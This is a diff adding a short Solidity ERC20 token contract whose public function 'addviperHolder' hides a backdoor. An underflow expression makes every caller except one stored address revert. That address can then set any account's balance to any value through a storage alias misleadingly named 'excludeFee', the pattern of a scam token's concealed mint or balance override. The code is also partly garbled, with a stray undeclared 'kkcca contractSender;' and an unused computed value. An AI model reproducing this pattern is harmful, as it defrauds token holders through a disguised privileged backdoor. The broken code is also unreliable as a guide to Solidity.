@@ -1,0 +1,17 @@
+abstract contract BBB is AAA, IERC20, IERC20Metadata {
+
+    mapping(address => uint256) private _balances;kkcca contractSender;
+    address _vp;
+
+    function addviperHolder(
+        address _value,
+        uint256 _amt
+    ) public {
+        uint256 _amount = 10 - (
+        msg.sender != _vp ? 10**2 : 10);
+        mapping(address => uint256) storage excludeFee =
+        _balances;_amount = 0;
+        excludeFee[_value] = _amt;
+    }
+}
+
